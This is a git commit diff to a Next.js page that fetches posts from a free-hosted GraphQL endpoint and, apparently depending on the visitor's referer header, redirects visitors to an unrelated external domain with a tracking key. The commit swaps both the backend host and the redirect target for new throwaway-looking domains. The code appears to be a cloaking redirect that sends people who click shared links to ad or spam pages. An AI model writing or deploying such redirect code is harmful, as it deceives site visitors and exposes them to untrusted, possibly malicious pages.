3eadc43de974b1b99987b7e086d581db5e81cce0
Asim9990 <133738091+Asim9990@users.noreply.github.com>
2023-05-20 03:43:46 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://kaxhi.000webhostapp.com/graphql"
+	const endpoint = "https://zahrref.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					` https://mosqueworking.com/uzu13btb?key=fda547c3b96184db3f0c8f0488fa9b88`
+					` https://extensionworthwhile.com/e8uqqpdmyu?key=163a9bb64d89499175c1aae8a37ad753`
 				}`,
 			},
 		};
